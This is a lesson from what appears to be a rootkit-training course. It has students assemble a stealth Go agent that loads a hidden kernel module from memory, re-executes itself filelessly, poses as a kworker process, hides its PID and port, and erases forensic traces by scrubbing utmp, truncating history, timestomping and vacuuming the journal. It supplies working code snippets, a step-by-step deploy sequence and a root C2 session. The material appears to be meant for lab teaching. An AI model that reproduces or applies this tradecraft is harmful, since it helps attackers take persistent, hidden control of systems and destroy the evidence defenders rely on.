# M03: Ghost

L20 through L24 each solved one visibility problem.
Now integrate all of them into a single agent that leaves no trace.
Run every defender tool an analyst would use.
Find nothing.

## The ghost checklist

```text
  Defender tool      What it finds         Tradecraft that defeats it
  -----------------------------------------------------------------------
  lsmod              kernel module          module hiding (mkdir h.m)
  ps aux             agent process          process masquerade ([kworker])
  ss -tlnp           listening port         port hiding (mkdir h.p)
  ls / find          agent binary           fileless exec (memfd, L21)
  file rklings.ko    module on disk         fileless load (memfd, L20)
  last / who         login session          utmp scrub (L24)
  history            typed commands         history truncate (L24)
  stat               timestamps             timestomping (L24)
  cat /proc/pid/..   process details        PR_SET_DUMPABLE=0 (L23)
  coredumpctl        crash dumps            RLIMIT_CORE=0 (L23)
  journalctl         system journal         journal vacuum (L24)
  /proc/pid/comm     process name           prctl PR_SET_NAME (L23)
```

## Execution order

The agent must perform these steps in the right sequence.
Each step depends on the previous ones being complete.

```text
  1. Connect to server over mTLS          (L15)
  2. Receive DEPLOY command
  3. Escalate to root                     (mkdir rklings.e)
  4. Load .ko from memory (memfd)         (L20: MemfdCreate + FinitModule)
  5. Hide the module                      (mkdir rklings.h.m)
  6. Re-exec self from memory (memfd)     (L21: MemfdCreate + Exec)
  7. Masquerade as kworker                (L23: prctl PR_SET_NAME)
  8. Disable dumps                        (L23: PR_SET_DUMPABLE=0, RLIMIT_CORE=0)
  9. Hide own PID                         (mkdir rklings.h.i.<pid>)
  10. Hide server port                    (mkdir rklings.h.p.443)
  11. Scrub utmp/wtmp                     (L24: scrubUtmp)
  12. Scrub history                       (L24: clearHistory)
  13. Timestomp any files touched         (L24: timestomp)
  14. Vacuum journal                      (L24: tamperJournal)
  15. Clear environment                   (L24: os.Clearenv)
  16. Enter command loop                  (L17: dispatch)
```

After step 16, the agent is invisible and operational.
The server can send commands.
The kernel module hides everything.
No forensic artifact remains.

## You write

`main.go` (~200 lines):

- `deploy()`: steps 3 through 15, the full ghost sequence
- `loadModuleFromMemory(koBytes []byte)`: memfd + finit_module (L20)
- `reexecFromMemory()`: memfd + exec /proc/self/fd/N (L21)
- `masquerade()`: prctl PR_SET_NAME + PR_SET_DUMPABLE + RLIMIT_CORE (L23)
- `hideAll()`: mkdir commands to hide module, PID, port (kernel bridge)
- `scrubAll()`: utmp, history, timestamps, journal, env (L24)
- `commandLoop()`: mTLS dispatch with all handlers (L17)

The starter provides the mTLS connection and command dispatch skeleton.
Fill in the deploy sequence and each tradecraft function.

## API

```go
// Fileless module load (L20)
fd, _ := unix.MemfdCreate("", unix.MFD_CLOEXEC)
unix.Write(fd, koBytes)
unix.FinitModule(fd, "", 0)
unix.Close(fd)

// Fileless self-exec (L21)
fd, _ := unix.MemfdCreate("", 0)  // no MFD_CLOEXEC
unix.Write(fd, selfBytes)
unix.Exec(fmt.Sprintf("/proc/self/fd/%d", fd), os.Args, os.Environ())

// Process masquerade (L23)
unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})

// Kernel bridge
os.Mkdir("/tmp/rklings.h.m", 0755)
os.Mkdir(fmt.Sprintf("/tmp/rklings.h.i.%d", os.Getpid()), 0755)
os.Mkdir("/tmp/rklings.h.p.443", 0755)

// Anti-forensics (L24)
os.Chtimes(path, refTime, refTime)
os.Truncate(histPath, 0)
// utmp scrub: walk 384-byte records, zero matching username
exec.Command("journalctl", "--vacuum-time=1s").Run()
os.Clearenv()
```

## Test it

```
$ rklings run m03

(agent deploys, all tradecraft runs automatically)

$ rklings validate m03
  [+] agent responds to PING
  [+] lsmod: no rklings module
  [+] ps aux: no agent process
  [+] ss -tlnp: no port 443 visible
  [+] find / -name agent: no binary found
  [+] last: no login record
  [+] /proc/<pid>/dumpable: 0
  [+] coredumpctl: no dump possible
  [+] timestamps blend with system files
  [+] history: empty
  [+] journal: clean
  PASS
```

In the VM, running defender tools manually:

```
student@vm:~$ lsmod | grep rklings
(no output)
student@vm:~$ ps aux | grep -v grep | grep agent
(no output)
student@vm:~$ ss -tlnp | grep 443
(no output)
student@vm:~$ find / -name "agent" -o -name "rklings.ko" 2>/dev/null
(no output)
student@vm:~$ last | grep student
(no output)
student@vm:~$ cat ~/.bash_history
(empty)
```

Meanwhile, from the server:

```
rklings> ping
PONG (8ms)
rklings> shell whoami
root
rklings> shell uname -r
7.0.0-38-generic
```

The agent is there.
You just cannot see it.

## Validate

```
$ rklings validate m03
  [+] agent deployed and operational
  [+] lsmod shows nothing
  [+] ps shows no agent
  [+] ss shows no port
  [+] find shows no binary
  [+] last shows no login
  [+] not dumpable
  [+] timestamps clean
  PASS
```

## Next

P00 takes the ghost agent to production: real domain, real target, real
obfuscation, build hardening with garble.
